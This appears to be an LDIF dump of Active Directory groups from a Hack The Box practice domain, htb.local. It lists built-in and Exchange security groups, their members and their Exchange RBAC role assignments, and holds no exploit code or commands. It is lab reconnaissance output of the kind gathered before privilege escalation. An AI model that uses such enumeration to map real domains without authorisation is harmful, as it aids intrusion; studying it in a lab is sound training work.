# Remote Management Users, Builtin, htb.local
dn: CN=Remote Management Users,CN=Builtin,DC=htb,DC=local
objectClass: top
objectClass: group
cn: Remote Management Users
description: Members of this group can access WMI resources over management pr
 otocols (such as WS-Management via the Windows Remote Management service). Th
 is applies only to WMI namespaces that grant access to the user.
member: CN=Privileged IT Accounts,OU=Security Groups,DC=htb,DC=local
distinguishedName: CN=Remote Management Users,CN=Builtin,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923220353.0Z
uSNCreated: 8232
uSNChanged: 81988
name: Remote Management Users
objectGUID:: fyKTwax9uEiQuRYYk+74xQ==
objectSid:: AQIAAAAAAAUgAAAARAIAAA==
sAMAccountName: Remote Management Users
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# System Managed Accounts Group, Builtin, htb.local
dn: CN=System Managed Accounts Group,CN=Builtin,DC=htb,DC=local
objectClass: top
objectClass: group
cn: System Managed Accounts Group
description: Members of this group are managed by the system.
member: CN=DefaultAccount,CN=Users,DC=htb,DC=local
distinguishedName: CN=System Managed Accounts Group,CN=Builtin,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 8233
uSNChanged: 8235
name: System Managed Accounts Group
objectGUID:: IiKSgtRPMU6ANiKQhf9Qsg==
objectSid:: AQIAAAAAAAUgAAAARQIAAA==
sAMAccountName: System Managed Accounts Group
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# Storage Replica Administrators, Builtin, htb.local
dn: CN=Storage Replica Administrators,CN=Builtin,DC=htb,DC=local
objectClass: top
objectClass: group
cn: Storage Replica Administrators
description: Members of this group have complete and unrestricted access to al
 l features of Storage Replica.
distinguishedName: CN=Storage Replica Administrators,CN=Builtin,DC=htb,DC=loca
 l
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 8236
uSNChanged: 8236
name: Storage Replica Administrators
objectGUID:: 6VUQ+06JZkOaV8PhCg9iHg==
objectSid:: AQIAAAAAAAUgAAAARgIAAA==
sAMAccountName: Storage Replica Administrators
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# Server Operators, Builtin, htb.local
dn: CN=Server Operators,CN=Builtin,DC=htb,DC=local

# Microsoft Exchange Security Groups, htb.local
dn: OU=Microsoft Exchange Security Groups,DC=htb,DC=local
objectClass: top
objectClass: organizationalUnit
ou: Microsoft Exchange Security Groups
distinguishedName: OU=Microsoft Exchange Security Groups,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919111113.0Z
whenChanged: 20190919111114.0Z
uSNCreated: 21502
uSNChanged: 21639
name: Microsoft Exchange Security Groups
objectGUID:: 0rFBJXk5nU+JdDdddMehcA==
systemFlags: 1073741824
objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=htb,DC=lo
 cal
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z
msExchVersion: 4535486012416
msExchEdgeSyncConfigFlags: 0

# Organization Management, Microsoft Exchange Security Groups, htb.local
dn: CN=Organization Management,OU=Microsoft Exchange Security Groups,DC=htb,DC
 =local
objectClass: top
objectClass: group
cn: Organization Management
description: Members of this management role group have permissions to manage 
 Exchange objects and their properties in the Exchange organization. Members c
 an also delegate role groups and management roles in the organization. This r
 ole group shouldn't be deleted.
member: CN=Administrator,CN=Users,DC=htb,DC=local
distinguishedName: CN=Organization Management,OU=Microsoft Exchange Security G
 roups,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919111114.0Z
whenChanged: 20190923220353.0Z
uSNCreated: 21504
uSNChanged: 81991
garbageCollPeriod: 1209600
name: Organization Management
objectGUID:: Km4Pyw1AC06BQmrCK+Kuqw==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPUAQAAA==
sAMAccountName: Organization Management
sAMAccountType: 268435456
managedBy: CN=Organization Management,OU=Microsoft Exchange Security Groups,DC
 =htb,DC=local
managedObjects: CN=Security Administrator,OU=Microsoft Exchange Security Group
 s,DC=htb,DC=local
managedObjects: CN=Security Reader,OU=Microsoft Exchange Security Groups,DC=ht
 b,DC=local
managedObjects: CN=Compliance Management,OU=Microsoft Exchange Security Groups
 ,DC=htb,DC=local
managedObjects: CN=Hygiene Management,OU=Microsoft Exchange Security Groups,DC
 =htb,DC=local
managedObjects: CN=Delegated Setup,OU=Microsoft Exchange Security Groups,DC=ht
 b,DC=local
managedObjects: CN=Server Management,OU=Microsoft Exchange Security Groups,DC=
 htb,DC=local
managedObjects: CN=Discovery Management,OU=Microsoft Exchange Security Groups,
 DC=htb,DC=local
managedObjects: CN=Records Management,OU=Microsoft Exchange Security Groups,DC
 =htb,DC=local
managedObjects: CN=Help Desk,OU=Microsoft Exchange Security Groups,DC=htb,DC=l
 ocal
managedObjects: CN=UM Management,OU=Microsoft Exchange Security Groups,DC=htb,
 DC=local
managedObjects: CN=Public Folder Management,OU=Microsoft Exchange Security Gro
 ups,DC=htb,DC=local
managedObjects: CN=View-Only Organization Management,OU=Microsoft Exchange Sec
 urity Groups,DC=htb,DC=local
managedObjects: CN=Recipient Management,OU=Microsoft Exchange Security Groups,
 DC=htb,DC=local
managedObjects: CN=Organization Management,OU=Microsoft Exchange Security Grou
 ps,DC=htb,DC=local
groupType: -2147483640
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z
msExchVersion: 44220983382016
msExchGroupJoinRestriction: 0
msExchProvisioningFlags: 0
msExchMailboxAuditEnable: FALSE
msExchUserBL: CN=MyVoiceMail-Organization Management-Delegating,CN=Role Assign
 ments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Conf
 iguration,DC=htb,DC=local
msExchUserBL: CN=MyTextMessaging-Organization Management-Delegating,CN=Role As
 signments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=
 Configuration,DC=htb,DC=local
msExchUserBL: CN=MyTeamMailboxes-Organization Management-Delegating,CN=Role As
 signments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=
 Configuration,DC=htb,DC=local
msExchUserBL: CN=MyRetentionPolicies-Organization Management-Delegating,CN=Rol
 e Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services
 ,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=MyProfileInformation-Organization Management-Delegating,CN=Ro
 le Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Service
 s,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=MyMailboxDelegation-Organization Management-Delegating,CN=Rol
 e Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services
 ,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=MyDistributionGroups-Organization Management-Delegating,CN=Ro
 le Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Service
 s,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=MyDistributionGroupMembership-Organization Management-Delegat
 ing,CN=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,C
 N=Services,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=MyDiagnostics-Organization Management-Delegating,CN=Role Assi
 gnments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Co
 nfiguration,DC=htb,DC=local
msExchUserBL: CN=MyContactInformation-Organization Management-Delegating,CN=Ro
 le Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Service
 s,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=MyBaseOptions-Organization Management-Delegating,CN=Role Assi
 gnments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Co
 nfiguration,DC=htb,DC=local
msExchUserBL: CN=My ReadWriteMailbox Apps-Organization Management-Delegating,C
 N=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Ser
 vices,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=My Marketplace Apps-Organization Management-Delegating,CN=Rol
 e Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services
 ,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=My Custom Apps-Organization Management-Delegating,CN=Role Ass
 ignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=C
 onfiguration,DC=htb,DC=local
msExchUserBL: CN=WorkloadManagement-Organization Management,CN=Role Assignment
 s,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configur
 ation,DC=htb,DC=local
msExchUserBL: CN=WorkloadManagement-Organization Management-Delegating,CN=Role
  Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,
 CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=View-Only Recipients-Organization Management,CN=Role Assignme
 nts,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Config
 uration,DC=htb,DC=local
msExchUserBL: CN=View-Only Recipients-Organization Management-Delegating,CN=Ro
 le Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Service
 s,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=View-Only Configuration-Organization Management,CN=Role Assig
 nments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Con
 figuration,DC=htb,DC=local
msExchUserBL: CN=View-Only Configuration-Organization Management-Delegating,CN
 =Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Serv
 ices,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=View-Only Audit Logs-Organization Management,CN=Role Assignme
 nts,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Config
 uration,DC=htb,DC=local
msExchUserBL: CN=View-Only Audit Logs-Organization Management-Delegating,CN=Ro
 le Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Service
 s,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=User Options-Organization Management,CN=Role Assignments,CN=R
 BAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,
 DC=htb,DC=local
msExchUserBL: CN=User Options-Organization Management-Delegating,CN=Role Assig
 nments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Con
 figuration,DC=htb,DC=local
msExchUserBL: CN=UserApplication-Organization Management-Delegating,CN=Role As
 signments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=
 Configuration,DC=htb,DC=local
msExchUserBL: CN=Unified Messaging-Organization Management,CN=Role Assignments
 ,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configura
 tion,DC=htb,DC=local
msExchUserBL: CN=Unified Messaging-Organization Management-Delegating,CN=Role 
 Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,C
 N=Configuration,DC=htb,DC=local
msExchUserBL: CN=UnScoped Role Management-Organization Management-Delegating,C
 N=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Ser
 vices,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=UM Prompts-Organization Management,CN=Role Assignments,CN=RBA
 C,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC
 =htb,DC=local
msExchUserBL: CN=UM Prompts-Organization Management-Delegating,CN=Role Assignm
 ents,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Confi
 guration,DC=htb,DC=local
msExchUserBL: CN=UM Mailboxes-Organization Management,CN=Role Assignments,CN=R
 BAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,
 DC=htb,DC=local
msExchUserBL: CN=UM Mailboxes-Organization Management-Delegating,CN=Role Assig
 nments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Con
 figuration,DC=htb,DC=local
msExchUserBL: CN=Transport Rules-Organization Management,CN=Role Assignments,C
 N=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configurati
 on,DC=htb,DC=local
msExchUserBL: CN=Transport Rules-Organization Management-Delegating,CN=Role As
 signments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=
 Configuration,DC=htb,DC=local
msExchUserBL: CN=Transport Queues-Organization Management,CN=Role Assignments,
 CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configurat
 ion,DC=htb,DC=local
msExchUserBL: CN=Transport Queues-Organization Management-Delegating,CN=Role A
 ssignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN
 =Configuration,DC=htb,DC=local
msExchUserBL: CN=Transport Hygiene-Organization Management,CN=Role Assignments
 ,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configura
 tion,DC=htb,DC=local
msExchUserBL: CN=Transport Hygiene-Organization Management-Delegating,CN=Role 
 Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,C
 N=Configuration,DC=htb,DC=local
msExchUserBL: CN=Transport Agents-Organization Management,CN=Role Assignments,
 CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configurat
 ion,DC=htb,DC=local
msExchUserBL: CN=Transport Agents-Organization Management-Delegating,CN=Role A
 ssignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN
 =Configuration,DC=htb,DC=local
msExchUserBL: CN=Team Mailboxes-Organization Management,CN=Role Assignments,CN
 =RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuratio
 n,DC=htb,DC=local
msExchUserBL: CN=Team Mailboxes-Organization Management-Delegating,CN=Role Ass
 ignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=C
 onfiguration,DC=htb,DC=local
msExchUserBL: CN=TeamMailboxLifecycleApplication-Organization Management-Deleg
 ati,CN=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,C
 N=Services,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=Support Diagnostics-Organization Management-Delegating,CN=Rol
 e Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services
 ,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=SendMailApplication-Organization Management-Delegating,CN=Rol
 e Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services
 ,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=Send Connectors-Organization Management,CN=Role Assignments,C
 N=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configurati
 on,DC=htb,DC=local
msExchUserBL: CN=Send Connectors-Organization Management-Delegating,CN=Role As
 signments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=
 Configuration,DC=htb,DC=local
msExchUserBL: CN=Security Reader-Organization Management,CN=Role Assignments,C
 N=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configurati
 on,DC=htb,DC=local
msExchUserBL: CN=Security Reader-Organization Management-Delegating,CN=Role As
 signments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=
 Configuration,DC=htb,DC=local
msExchUserBL: CN=Security Group Creation and Membership-Organization Managemen
 t,CN=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=
 Services,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=Security Group Creation and Membership-Organization Managemen
 t-D,CN=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,C
 N=Services,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=Security Admin-Organization Management,CN=Role Assignments,CN
 =RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuratio
 n,DC=htb,DC=local
msExchUserBL: CN=Security Admin-Organization Management-Delegating,CN=Role Ass
 ignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=C
 onfiguration,DC=htb,DC=local
msExchUserBL: CN=Role Management-Organization Management,CN=Role Assignments,C
 N=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configurati
 on,DC=htb,DC=local
msExchUserBL: CN=Role Management-Organization Management-Delegating,CN=Role As
 signments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=
 Configuration,DC=htb,DC=local
msExchUserBL: CN=Retention Management-Organization Management,CN=Role Assignme
 nts,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Config
 uration,DC=htb,DC=local
msExchUserBL: CN=Retention Management-Organization Management-Delegating,CN=Ro
 le Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Service
 s,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=Reset Password-Organization Management-Delegating,CN=Role Ass
 ignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=C
 onfiguration,DC=htb,DC=local
msExchUserBL: CN=Remote and Accepted Domains-Organization Management,CN=Role A
 ssignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN
 =Configuration,DC=htb,DC=local
msExchUserBL: CN=Remote and Accepted Domains-Organization Management-Delegatin
 g,CN=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=
 Services,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=Recipient Policies-Organization Management,CN=Role Assignment
 s,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configur
 ation,DC=htb,DC=local
msExchUserBL: CN=Recipient Policies-Organization Management-Delegating,CN=Role
  Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,
 CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=Receive Connectors-Organization Management,CN=Role Assignment
 s,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configur
 ation,DC=htb,DC=local
msExchUserBL: CN=Receive Connectors-Organization Management-Delegating,CN=Role
  Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,
 CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=Public Folders-Organization Management,CN=Role Assignments,CN
 =RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuratio
 n,DC=htb,DC=local
msExchUserBL: CN=Public Folders-Organization Management-Delegating,CN=Role Ass
 ignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=C
 onfiguration,DC=htb,DC=local
msExchUserBL: CN=POP3 And IMAP4 Protocols-Organization Management,CN=Role Assi
 gnments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Co
 nfiguration,DC=htb,DC=local
msExchUserBL: CN=POP3 And IMAP4 Protocols-Organization Management-Delegating,C
 N=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Ser
 vices,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=Organization Transport Settings-Organization Management,CN=Ro
 le Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Service
 s,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=Organization Transport Settings-Organization Management-Deleg
 ati,CN=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,C
 N=Services,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=Organization Configuration-Organization Management,CN=Role As
 signments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=
 Configuration,DC=htb,DC=local
msExchUserBL: CN=Organization Configuration-Organization Management-Delegating
 ,CN=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=S
 ervices,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=Organization Client Access-Organization Management,CN=Role As
 signments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=
 Configuration,DC=htb,DC=local
msExchUserBL: CN=Organization Client Access-Organization Management-Delegating
 ,CN=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=S
 ervices,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=Org Marketplace Apps-Organization Management,CN=Role Assignme
 nts,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Config
 uration,DC=htb,DC=local
msExchUserBL: CN=Org Marketplace Apps-Organization Management-Delegating,CN=Ro
 le Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Service
 s,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=Org Custom Apps-Organization Management,CN=Role Assignments,C
 N=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configurati
 on,DC=htb,DC=local
msExchUserBL: CN=Org Custom Apps-Organization Management-Delegating,CN=Role As
 signments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=
 Configuration,DC=htb,DC=local
msExchUserBL: CN=OfficeExtensionApplication-Organization Management-Delegating
 ,CN=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=S
 ervices,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=Move Mailboxes-Organization Management,CN=Role Assignments,CN
 =RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuratio
 n,DC=htb,DC=local
msExchUserBL: CN=Move Mailboxes-Organization Management-Delegating,CN=Role Ass
 ignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=C
 onfiguration,DC=htb,DC=local
msExchUserBL: CN=Monitoring-Organization Management,CN=Role Assignments,CN=RBA
 C,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC
 =htb,DC=local
msExchUserBL: CN=Monitoring-Organization Management-Delegating,CN=Role Assignm
 ents,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Confi
 guration,DC=htb,DC=local
msExchUserBL: CN=Migration-Organization Management,CN=Role Assignments,CN=RBAC
 ,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=
 htb,DC=local
msExchUserBL: CN=Migration-Organization Management-Delegating,CN=Role Assignme
 nts,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Config
 uration,DC=htb,DC=local
msExchUserBL: CN=Message Tracking-Organization Management,CN=Role Assignments,
 CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configurat
 ion,DC=htb,DC=local
msExchUserBL: CN=Message Tracking-Organization Management-Delegating,CN=Role A
 ssignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN
 =Configuration,DC=htb,DC=local
msExchUserBL: CN=MeetingGraphApplication-Organization Management-Delegating,CN
 =Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Serv
 ices,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=MailboxSearchApplication-Organization Management-Delegating,C
 N=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Ser
 vices,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=Mailbox Search-Organization Management-Delegating,CN=Role Ass
 ignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=C
 onfiguration,DC=htb,DC=local
msExchUserBL: CN=Mailbox Import Export-Organization Management-Delegating,CN=R
 ole Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Servic
 es,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=Mail Tips-Organization Management,CN=Role Assignments,CN=RBAC
 ,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=
 htb,DC=local
msExchUserBL: CN=Mail Tips-Organization Management-Delegating,CN=Role Assignme
 nts,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Config
 uration,DC=htb,DC=local
msExchUserBL: CN=Mail Recipients-Organization Management,CN=Role Assignments,C
 N=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configurati
 on,DC=htb,DC=local
msExchUserBL: CN=Mail Recipients-Organization Management-Delegating,CN=Role As
 signments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=
 Configuration,DC=htb,DC=local
msExchUserBL: CN=Mail Recipient Creation-Organization Management,CN=Role Assig
 nments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Con
 figuration,DC=htb,DC=local
msExchUserBL: CN=Mail Recipient Creation-Organization Management-Delegating,CN
 =Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Serv
 ices,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=Mail Enabled Public Folders-Organization Management,CN=Role A
 ssignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN
 =Configuration,DC=htb,DC=local
msExchUserBL: CN=Mail Enabled Public Folders-Organization Management-Delegatin
 g,CN=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=
 Services,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=LegalHoldApplication-Organization Management-Delegating,CN=Ro
 le Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Service
 s,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=Legal Hold-Organization Management,CN=Role Assignments,CN=RBA
 C,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC
 =htb,DC=local
msExchUserBL: CN=Legal Hold-Organization Management-Delegating,CN=Role Assignm
 ents,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Confi
 guration,DC=htb,DC=local
msExchUserBL: CN=Journaling-Organization Management,CN=Role Assignments,CN=RBA
 C,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC
 =htb,DC=local
msExchUserBL: CN=Journaling-Organization Management-Delegating,CN=Role Assignm
 ents,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Confi
 guration,DC=htb,DC=local
msExchUserBL: CN=Information Rights Management-Organization Management,CN=Role
  Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,
 CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=Information Rights Management-Organization Management-Delegat
 ing,CN=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,C
 N=Services,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=Federated Sharing-Organization Management,CN=Role Assignments
 ,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configura
 tion,DC=htb,DC=local
msExchUserBL: CN=Federated Sharing-Organization Management-Delegating,CN=Role 
 Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,C
 N=Configuration,DC=htb,DC=local
msExchUserBL: CN=Exchange Virtual Directories-Organization Management,CN=Role 
 Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,C
 N=Configuration,DC=htb,DC=local
msExchUserBL: CN=Exchange Virtual Directories-Organization Management-Delegati
 ng,CN=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN
 =Services,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=Exchange Servers-Organization Management,CN=Role Assignments,
 CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configurat
 ion,DC=htb,DC=local
msExchUserBL: CN=Exchange Servers-Organization Management-Delegating,CN=Role A
 ssignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN
 =Configuration,DC=htb,DC=local
msExchUserBL: CN=Exchange Server Certificates-Organization Management,CN=Role 
 Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,C
 N=Configuration,DC=htb,DC=local
msExchUserBL: CN=Exchange Server Certificates-Organization Management-Delegati
 ng,CN=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN
 =Services,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=ExchangeCrossServiceIntegration-Organization Management-Deleg
 ati,CN=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,C
 N=Services,CN=Configuration,DC=htb,DC=local
msExchUserBL: CN=Exchange Connectors-Organization Management,CN=Role Assignmen
 ts,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configu
 ration,DC=htb,DC=local
msExchUserBL: CN=Exchange Connectors-Organization Management-Delegating,CN=Rol
 e Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services
 ,CN=Configuration,DC=htb,DC=local
